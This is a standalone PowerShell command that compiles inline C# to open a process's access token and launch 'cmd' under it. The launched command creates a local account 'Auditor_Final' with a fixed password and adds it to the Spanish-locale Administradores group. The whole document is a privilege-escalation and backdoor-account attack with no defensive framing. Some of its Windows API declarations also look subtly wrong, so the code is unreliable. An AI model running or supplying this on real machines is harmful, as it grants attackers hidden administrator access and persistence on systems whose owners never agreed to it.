powershell -nop -c "$c=@'
using System;
using System.Runtime.InteropServices;
public class P{
 [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
 [DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint a,bool b,uint p);
 [DllImport(\"advapi32.dll\",CharSet=CharSet.Auto)]public static extern bool CreateProcessWithTokenW(IntPtr t,uint f,string n,string l,uint c,IntPtr e,string d,ref byte[] s,out uint[] i);
 public static void Run(){
  IntPtr h=OpenProcess(0x0400,false,904);
  IntPtr tk=IntPtr.Zero;
  OpenProcessToken(h,0x0002,out tk);
  byte[] s=new byte[68];
  uint[] i=new uint[4];
  CreateProcessWithTokenW(tk,0,null,\"cmd /c net user Auditor_Final Pass123! /add && net localgroup Administradores Auditor_Final /add\",0,IntPtr.Zero,null,ref s,out i);
 }
}
'@; Add-Type -TypeDefinition $c; [P]::Run()"